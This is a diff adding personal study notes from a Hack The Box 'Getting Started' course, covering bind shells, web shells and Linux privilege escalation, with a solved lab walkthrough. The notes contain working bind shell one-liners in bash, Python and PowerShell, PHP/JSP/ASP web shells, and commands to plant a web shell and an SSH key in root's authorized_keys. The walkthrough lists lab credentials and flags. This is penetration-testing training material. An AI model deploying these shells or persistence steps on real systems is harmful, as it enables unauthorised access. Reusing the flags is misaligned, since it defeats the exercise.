@@ -646,3 +646,291 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 This type of shell is handy when we want to get a quick, reliable connection to our compromised host. But it can be very fragile.
 
 ## Bind Shell
+This is different from the Reverse Shell (it connects to us). Here, we will have to connect to it on the targets' listening port.
+
+Once we execute a command, it will start listening on a port on the remote host and bind that host's shell to that port.
+
+### Bind Shell Command
+These are commands we can use to start a bind shell (but we can use Payload All The Things if we want to use a certain payload to start a bind shell):
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+
+
+```python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+
+### Netcat Connection
+Once we execute the command, we should have a shell waiting for us on the specified port. 
+```shell-session
+nc 10.10.10.1 1234
+```
+
+If we drop our connection to a bind shell, we can connect back to it and get another connection immediately. But if the bind shell command is stopped or the device is rebooted, we will have to exploit it again to gain access.
+
+### Upgrading TTY
+```shell-session
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+After we run this command, we will hit `Ctrl + Z` to background our shell and get back on our local terminal, and input the following stty command:
+```shell-session
+www-data@remotehost$ ^Z
+
+mapacheroja@htb[/htb]$ stty raw -echo
+mapacheroja@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+```
+
+The next commands are to fix the terminal size (these have to be executed on the local host):
+
+```shell-session
+echo $TERM
+stty size
+```
+
+These have to be executed on the remote host:
+```shell-session
+export TERM=xterm-256color
+stty rows 67 columns 318
+```
+
+## Web Shell
+It is typically a web script that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
+
+### Writing a Web Shell
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+```asp
+<% eval request("cmd") %>
+```
+
+### Uploading a Web Shell
+We need to place our web shell script into the remote host's web directory to execute the script through the web browser. This can be a vulnerability linked to the action of uploading a file. 
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| Apache     | /var/www/html/         |
+| Nginx      | /usr/local/nginx/html/ |
+| IIS        | c:\inetpub\wwwroot\    |
+| XAMPP      | C:\xampp\htdocs\       |
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+### Accessing Web Shell
+We can do it through a browser or by using cURL.
+```shell-session
+curl http://SERVER_IP:PORT/shell.php?cmd=id
+```
+
+# Privilege Escalation
+## PrivEsc Checklists
+Once we gain access to the box, we have to enumerate it to find any potential vulnerabilities we can exploit to achieve a higher privilege level. 
+One excellent resource we can search is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings. 
+
+## Enumeration Scripts
+There are some common Linux enumeration scripts like LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.
+
+Antoher useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), and it includes scripts for both Linux and Windows.
+
+> These scripts can make a lot of noise, so in some cases we will have to do manual enumeration. 
+
+```shell-session
+mapacheroja@htb[/htb]$ ./linpeas.sh
+...SNIP...
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEYEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMangenta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.9.0-73-generic
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...SNIP...
+```
+
+## Kernel Exploits
+Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. 
+
+We can search on google the Linux version we obtained before or use searchsploit, so we could find the CVE name for this vulnerability. 
+
+## Vulnerable Software
+We can use `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use.
+
+## User Privileges
+These are common ways to exploit certain user privileges:
+1. Sudo
+2. SUID
+3. Windows Token Privileges
+
+We can check the `sudo` privileges we have with the `sudo -l` command.
+```shell-session
+mapacheroja@htb[/htb]$ sudo -l
+
+[sudo] password for user1:
+...SNIP...
+
+User user1 may run the following commands on ExampleServer:
+    (ALL : ALL) ALL
+```
+
+The above output says that we can run all commands with sudo.
+```shell-session
+mapacheroja@htb[/htb]$ sudo su -
+
+[sudo] password for user1:
+whoami
+root
+```
+
+```shell-session
+mapacheroja@htb[/htb]$ sudo -l
+
+    (user : user) NOPASSWD: /bin/echo
+```
+The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password. 
+
+```shell-session
+mapacheroja@htb[/htb]$ sudo -u user /bin/echo Hello World!
+
+    Hello World!
+```
+
+GTFOBins contains a list of commands and how they can be exploited through sudo. 
+LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user. 
+
+## Scheduled Tasks
+There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
+1. Add new scheduled tasks/cron jobs
+2. Trick them to execute a malicious software
+
+The easiest way is to check if we are allowed to add new scheduled tasks. There are specific directories that we may be able to utilize to add new cron nobs if we have the write permissions over them. These include:
+1. `/etc/crontab`
+2. `/etc/cron.d`
+3. `/var/spool/cron/crontabs/root`
+
+## Exposed Credentials
+This is very common with configuration files, log files and user history files (bash_history in Linux and PSReadLine in Windows).
+```shell-session
+...SNIP...
+[+] Searching passwords in config PHP files
+[+] Finding passwords inside logs (limit 70)
+...SNIP...
+/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
+```
+
+We can also check for password reuse. 
+```shell-session
+mapacheroja@htb[/htb]$ su -
+
+Password: password123
+whoami
+
+root
+```
+
+## SSH Keys
+If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. 
+```shell-session
+mapacheroja@htb[/htb]$ vim id_rsa
+mapacheroja@htb[/htb]$ chmod 600 id_rsa
+mapacheroja@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
+
+root@10.10.10.10#
+```
+
+If we find ourselves with write access to a users /.ssh/ directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file.
+
+This command has to be executed on the local host.
+```shell-session
+ssh-keygen -f key
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******
+
+Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:...SNIP... user@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..o.++.+      |
+...SNIP...
+|     . ..oo+.    |
++----[SHA256]-----+
+```
+This will give us 2 files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
+```shell-session
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+```
+
+Now the server should allow us to log in as that user:
+```shell-session
+mapacheroja@htb[/htb]$ ssh root@10.10.10.10 -i key
+```
+
+#### Questions
+Target: 154.57.164.80:31921
+> SSH to 154.57.164.80:31921 with user "user1" and password "password1"
+
+1. SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
+
+```
+	ssh user1@154.57.164.80 -p 31921
+	sudo -l
+	User user1 may run the following commands on ng-2211924-gettingstartedprivesc-xtdf4-54bdbcbbfc-schd4:  
+	   (user2 : user2) NOPASSWD: /bin/bash	
+	   
+	sudo -u user2 /bin/bash
+	ls
+	cd ../user2/
+	cat flag.txt
+	HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
+```
+
+2. a
+```
+sudo -u user2 /bin/bash
+find / -perm -4000 2>/dev/null
+```
+
+There is nothing so I try something different:
+```
+find /root -readable -type f 2>/dev/null  
+/root/.bashrc
+/root/.profile  
+/root/.ssh/id_rsa  
+/root/.ssh/id_rsa.pub  
+/root/.bash_history  
+/root/.viminfo  
+```
+Here, we can see that we can read the private key. We copy all of the contents of the file and paste on our local machine in `/tmp/root_key`, we give it permissions with:
+ ```
+ chmod 600 /tmp/root_key
+ ``` 
+And we connect to the machine on our local host using the next command:
+```
+ssh -i /tmp/root_key -p 31921 root@154.57.164.80
+ls
+cat flag.txt
+HTB{pr1v1l363_35c4l4710n_2_r007}
+```
